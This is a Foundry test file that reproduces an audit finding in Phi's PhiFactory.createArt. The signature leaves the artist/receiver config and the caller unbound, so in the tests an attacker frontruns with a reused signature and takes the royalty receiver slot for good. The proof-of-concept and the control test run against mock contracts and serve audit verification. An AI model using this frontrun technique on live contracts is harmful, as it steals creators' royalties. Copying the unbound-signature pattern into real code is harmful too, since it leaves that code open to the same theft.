// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./41088-h-02-signature-replay-in-createart-allows-to-impersonate-art.sol";

/*//////////////////////////////////////////////////////////////
    Phi -- Signature replay in createArt allows impersonating the artist
    (H-02, #41088)

    PhiFactory.createArt verifies a signature over (expiresIn_, uri_,
    credHash_) only -- the CreateConfig (artist/receiver/royaltyBPS) is
    never covered by the signature, and the caller is never bound either.
    createERC1155Internal also succeeds silently whether it deploys a new
    art contract or one already exists -- so whoever's transaction lands
    FIRST permanently sets the config, and a frontrunner who reuses the
    legitimate signature with their OWN config captures the artist/receiver
    slot forever, stealing all future royalties.

    - test_exploit: drives the cheatcode-free Exploit end to end, then
      re-asserts the harm.
    - test_frontrunStealsArtistSlot: standalone rebuild with a REAL ECDSA
      signature (vm.sign), mirroring the finding's own PoC shape: the
      attacker's transaction lands first with their own config, the
      legitimate owner's correctly-signed transaction lands second and
      "succeeds" but is silently ignored.
    - test_legitimateCreateWorks: control -- if nobody frontruns, the
      legitimate config is the one that's stored.
//////////////////////////////////////////////////////////////////////////*/
contract PhiCreateArtSignatureReplayTest is Test {
    uint256 constant SIGNER_PK = 0xA11CE;

    function _sign(uint256 pk, bytes memory signedData) internal pure returns (bytes memory) {
        bytes32 digest = keccak256(signedData);
        bytes32 ethSigned = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", digest));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, ethSigned);
        return abi.encodePacked(r, s, v);
    }

    /// @notice HARM via the self-contained Exploit: the attacker frontruns with their
    ///         own config, the legitimate owner's later correctly-signed tx succeeds
    ///         but is silently ignored, and royalties flow to the attacker forever.
    function test_exploit() public {
        vm.chainId(1);
        Exploit e = new Exploit();
        e.run();

        PhiFactory2 factory = e.factory();
        MockRewardToken rewardToken = e.rewardToken();

        bytes32 uriHash = keccak256(bytes("sample-art-id"));
        address artAddr = factory.artByUriHash(uriHash);
        (, address receiver,) = factory.artData(artAddr);

        assertEq(receiver, e.ATTACKER(), "attacker captured the permanent receiver slot");
        assertEq(rewardToken.balanceOf(e.ATTACKER()), factory.ROYALTY_REWARD(), "attacker collected the royalty");
        assertEq(rewardToken.balanceOf(e.LEGIT_RECEIVER()), 0, "legitimate receiver got nothing");
    }

    /// @notice Standalone rebuild with a REAL ECDSA signature, mirroring the finding's
    ///         own PoC (owner prepares config+signature; attacker frontruns with the
    ///         SAME signature but their own config; owner's tx still "succeeds").
    function test_frontrunStealsArtistSlot() public {
        MockRewardToken rewardToken = new MockRewardToken();
        address signer = vm.addr(SIGNER_PK);
        PhiFactory2 factory = new PhiFactory2(signer, rewardToken);
        rewardToken.mint(address(factory), 1000);

        address owner = makeAddr("owner");
        address artist = makeAddr("artist");
        address legitReceiver = makeAddr("legitReceiver");
        address attacker = makeAddr("attacker");

        string memory uri = "another-sample-art";
        bytes memory signedData = abi.encode(uint256(2_000_000_000), uri, keccak256("SIGNATURE"));
        bytes memory sig = _sign(SIGNER_PK, signedData);

        PhiFactory2.CreateConfig memory attackerConfig =
            PhiFactory2.CreateConfig({ artist: artist, receiver: attacker, royaltyBPS: 500 });
        PhiFactory2.CreateConfig memory ownerConfig =
            PhiFactory2.CreateConfig({ artist: artist, receiver: legitReceiver, royaltyBPS: 500 });

        // Attacker observes the owner's intended createArt in the mempool and
        // frontruns it, reusing the SAME signedData/signature but their OWN config.
        vm.prank(attacker);
        address artAddr = factory.createArt(signedData, sig, attackerConfig);

        // Owner's transaction lands second, with the CORRECT config -- it does not
        // revert, but is silently ignored (the art contract already exists).
        vm.prank(owner);
        address artAddr2 = factory.createArt(signedData, sig, ownerConfig);
        assertEq(artAddr, artAddr2, "same art contract for both calls");

        (, address receiver,) = factory.artData(artAddr);
        assertEq(receiver, attacker, "attacker's frontrun config permanently won");

        vm.prank(attacker);
        factory.claimRoyalty(artAddr);
        assertEq(rewardToken.balanceOf(attacker), factory.ROYALTY_REWARD(), "attacker collects the stolen royalty");
        assertEq(rewardToken.balanceOf(legitReceiver), 0, "legitimate receiver never gets paid");
    }

    /// @notice Control: absent any frontrun, the legitimate config is the one stored.
    function test_legitimateCreateWorks() public {
        MockRewardToken rewardToken = new MockRewardToken();
        address signer = vm.addr(SIGNER_PK);
        PhiFactory2 factory = new PhiFactory2(signer, rewardToken);
        rewardToken.mint(address(factory), 1000);

        address artist = makeAddr("artist2");
        address legitReceiver = makeAddr("legitReceiver2");

        string memory uri = "no-frontrun-art";
        bytes memory signedData = abi.encode(uint256(2_000_000_000), uri, keccak256("SIGNATURE2"));
        bytes memory sig = _sign(SIGNER_PK, signedData);

        PhiFactory2.CreateConfig memory config =
            PhiFactory2.CreateConfig({ artist: artist, receiver: legitReceiver, royaltyBPS: 500 });

        address artAddr = factory.createArt(signedData, sig, config);
        (, address receiver,) = factory.artData(artAddr);
        assertEq(receiver, legitReceiver, "legitimate receiver stored correctly absent a frontrun");
    }
}
